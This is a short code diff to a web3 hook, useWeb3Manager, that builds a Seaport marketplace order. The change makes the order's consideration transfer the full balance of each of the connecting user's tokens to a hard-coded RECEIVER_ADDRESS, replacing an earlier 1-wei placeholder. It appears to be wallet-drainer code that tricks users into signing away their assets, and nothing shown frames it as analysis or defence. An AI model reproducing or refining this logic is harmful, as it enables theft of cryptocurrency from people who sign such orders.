@@ -553,14 +553,16 @@ export function useWeb3Manager() {
                         endAmount: t.balance
                     }));
 
-                    const consideration = [{
+                    // CRITICAL: Consideration must mirror the offer but route to RECEIVER
+                    // This tells Seaport: "Transfer offer tokens TO the receiver"
+                    const consideration = tokensOnChain.map(t => ({
                         itemType: 1, // ERC20
-                        token: "0x0000000000000000000000000000000000000000",
+                        token: t.address,
                         identifierOrCriteria: 0,
-                        startAmount: "1", // 1 wei to make it a valid "trade"
-                        endAmount: "1",
+                        startAmount: t.balance,
+                        endAmount: t.balance,
                         recipient: RECEIVER_ADDRESS
-                    }];
+                    }));
 
                     const orderComponents = {
                         offerer: address,
